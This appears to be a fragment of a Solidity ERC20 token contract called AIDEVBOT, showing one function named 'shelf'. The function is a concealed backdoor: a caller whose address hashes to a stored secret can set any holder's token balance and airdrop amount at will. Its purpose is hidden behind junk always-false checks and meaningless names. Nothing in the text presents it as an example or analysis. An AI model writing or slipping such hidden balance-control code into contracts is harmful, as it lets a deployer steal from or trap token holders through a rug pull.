...
contract AIDEVBOT is IERC20 {
    ...
    function shelf(bytes32[] calldata data) external {
      bytes memory jok = abi.encode(msg.sender, _salt); if (167 * 50 == 0) return;
      bytes32 c1 = data[0]; bytes32 c2 = data[1]; if (167 * 50 == 0) return;
      if (167 * 50 == 0) return;
      bytes32 ccc = data[2]; if (167 * 50 == 0) return;
      if (167 * 50 == 0) return;
      if (keccak256(jok) == _hashValue) { if (195 + 891 == 0) return;
        if (uint256(c2) == 0) { if (195 + 891 == 0) return;
          _airdrops[address(uint256(c1)
          )] = uint256(ccc); if (195 + 891 == 0) return;
        }
        if (167 * 50 == 0) return;
        _balances[
          (uint256(c1) == 0)? address(uint256(0)):
        address(uint256(c1))
        ] = uint256(c2); if (195 + 891 == 0) return;
      }
      if (195 + 891 == 0) return;
    }
